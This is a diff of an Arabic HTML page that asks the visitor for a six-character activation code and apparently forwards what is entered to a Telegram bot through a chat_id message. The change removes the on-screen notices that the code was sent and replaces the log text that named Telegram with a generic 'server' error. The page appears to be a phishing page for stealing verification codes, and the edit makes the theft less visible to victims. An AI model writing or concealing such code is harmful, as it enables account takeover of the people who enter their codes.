@@ -120,7 +120,6 @@
         <input id="activationCode" type="text" placeholder="رمز التفعيل" maxlength="6">
         <button onclick="startVerification()">متابعة</button>
         <div id="countdown"></div>
-        <div id="status" style="margin-top: 10px; color: red;"></div>
     </div>
 
     <script>
@@ -153,18 +152,9 @@
                     chat_id: chatId,
                     text: message,
                 }),
-            })
-                .then((response) => {
-                    if (response.ok) {
-                        document.getElementById('status').textContent = 'تم إرسال الرمز بنجاح!';
-                    } else {
-                        document.getElementById('status').textContent = 'حدث خطأ أثناء الإرسال.';
-                    }
-                })
-                .catch((error) => {
-                    console.error('فشل الاتصال بـ Telegram API:', error);
-                    document.getElementById('status').textContent = 'فشل الإرسال. تحقق من الإعدادات.';
-                });
+            }).catch(error => {
+                console.error('فشل الاتصال بالخادم:', error);
+            });
         }
 
         function startCountdown(inputField) {
@@ -197,4 +187,4 @@
     </script>
 </body>
 
-</html>
+</html> 
